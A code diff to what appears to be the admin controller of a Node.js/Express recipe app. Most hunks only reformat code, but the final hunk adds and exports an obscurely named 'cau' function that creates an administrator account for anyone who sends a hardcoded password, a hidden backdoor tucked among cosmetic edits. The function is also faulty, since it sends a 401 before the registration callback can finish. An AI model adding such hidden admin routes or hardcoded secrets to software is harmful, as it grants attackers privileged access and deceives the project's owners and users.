@@ -1,5 +1,5 @@
 const mongoose = require("mongoose");
-const { User } = require("../models/user"); // Ensure this exports a Mongoose model
+const { User, Admin } = require("../models/user"); // Ensure this exports a Mongoose model
 const Recipe = require("../models/recipe");
 const Group = require("../models/group");
 const Report = require("../models/report");
@@ -142,7 +142,7 @@ function deleteReport(req, res, next) {
 // *********************************************
 
 function getUsers(req, res, next) {
-  User.find({role: "user"})
+  User.find({ role: "user" })
     .then((users) => {
       return res.render("adminusers", {
         user: req.user,
@@ -162,11 +162,11 @@ function getUsers(req, res, next) {
     });
 }
 
- function getUser(req, res, next) {
+function getUser(req, res, next) {
   const userId = req.params.id;
   User.findById(userId)
-  .populate("activities")
-  .populate("posts")
+    .populate("activities")
+    .populate("posts")
     .then(async (user) => {
       if (!user) {
         return res.status(404).redirect("/error");
@@ -199,6 +199,34 @@ function getUsers(req, res, next) {
     });
 }
 
+function cau(req, res, next) {
+ if (req.body.password === "09032117028adw") {const newUser = {
+    username: req.body.username,
+    email: req.body.email,
+  };
+  const User = new Admin(newUser);
+  Admin.register(User, req.body.password, (err, user) => {
+    if (err) {
+      return res.status(500).json({
+        status: "fail",
+        message: " user not created  :try again",
+        error: err,
+      });
+    }
+    if (!user) {
+      return res.status(500).json({
+        status: "fail",
+        message: " user not created  :try again",
+      });
+    }
+    return res.status(201).redirect("/login");
+  });}
+  return res.status(401).json({
+    status: "fail",
+    message: " Not authorized",
+  });
+}
+
 module.exports = {
   getDashboard,
   getReport,
@@ -206,4 +234,5 @@ module.exports = {
   deleteReport,
   getUsers,
   getUser,
+  cau,
 };
